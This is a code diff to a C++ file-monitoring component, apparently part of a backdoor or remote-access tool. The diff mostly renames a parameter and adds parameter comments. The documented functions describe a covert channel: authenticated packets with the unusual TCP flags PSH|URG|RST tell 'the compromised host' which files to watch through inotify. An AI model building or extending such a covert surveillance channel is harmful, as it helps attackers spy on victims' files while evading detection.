@@ -51,13 +51,13 @@ FileMonitor::~FileMonitor() {
  * Adds a file to the inotify watch system.
  *
  * Params:
- *      const std::string &filename: The absolute path to the file to watch.
+ *      const std::string &path: The absolute path to watch.
  *
  * Returns:
  *      The watch file descriptor returned by inotify if monitoring started successfully, 0 or a
  *      negative number otherwise.
  */
-int FileMonitor::addWatchFile(const std::string &filename) {
+int FileMonitor::addWatchFile(const std::string &path) {
     static const int flags = (unsigned int)(IN_CREATE | IN_MODIFY | IN_DELETE);
 
     std::lock_guard<std::mutex> guard(this->lock);
@@ -134,6 +134,13 @@ void FileMonitor::runMonitoring() {
  * every sniffed packet. If a TCP packet contains the flags [PSH|URG|RST] and the packet is
  * authenticated, this function will add the file specified in the encrypted payload to the inotify
  * system.
+ *
+ * Params:
+ *      const pcap_pkthdr *header: The pcap header for the incoming packet.
+ *
+ *      const unsigned char *: The incoming packet.
+ *
+ *      NetworkEngine *net: A reference to the current network engine.
  */
 void FileMonitor::netCallback(const pcap_pkthdr *header, const unsigned char *packet,
                               NetworkEngine *net) {
@@ -189,6 +196,13 @@ void FileMonitor::netCallback(const pcap_pkthdr *header, const unsigned char *pa
 /*
  * Crafts a request that will be sent to the compromised host. The request has the flags
  * [PSH|URG|RST] and is authenticated. The filename is stored in the encrypted payload.
+ *
+ * Params:
+ *      const std::string &file: The name of the file to watch on the remote host.
+ *
+ *      const in_addr daddr: The address of the remote host in host byte order.
+ *
+ *      NetworkEngine *net: The network engine to use.
  */
 void FileMonitor::sendRequest(const std::string &file, const in_addr daddr, NetworkEngine *net) {
     static const unsigned char flags = TcpStack::PSH_FLAG | TcpStack::URG_FLAG | TcpStack::RST_FLAG;
